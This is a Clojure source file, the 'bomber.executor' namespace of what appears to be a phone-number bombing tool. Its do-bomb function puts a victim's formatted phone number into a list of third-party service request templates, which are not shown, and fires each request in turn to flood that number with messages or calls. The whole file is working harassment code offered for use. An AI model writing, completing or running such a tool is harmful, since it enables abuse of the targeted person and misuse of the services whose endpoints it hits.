(ns bomber.executor
  (:require [clj-http.client :as client]
            [bomber.service.formatter :as formatter])
  (:import (java.util.concurrent TimeoutException TimeUnit))
  (:use clojure.tools.logging)
  (:gen-class))

(defn- get-path [endpoint data]
  (cond
    (= endpoint data) []
    (map? data)       (some
                       (fn [[k v]]
                         (when-let [p (get-path endpoint v)]
                           (cons k p)))
                       data)))

(defn- set-params
  "put params into services requests"
  [service
   phonenumber]
  (assoc-in service (get-path :? service) phonenumber))

(defn- correct
  "correct reqest before send"
  [service
   phonenumber]
  (->
   (set-params service phonenumber)
   (dissoc :format :region)))

;todo wait hardcode
(defn do-bomb
  ([services
    phonenumber]
   (doseq [service services]
     (let [fomatted-number (formatter/format-number phonenumber (:region service) (:format service))]
       (.get
         (client/request
          (correct service fomatted-number)
          (fn [x] (info "response is:" x))
          (fn [x] (error (:url service) "for" fomatted-number "exception message is: " (.getMessage x)))))
       5 TimeUnit/SECONDS))))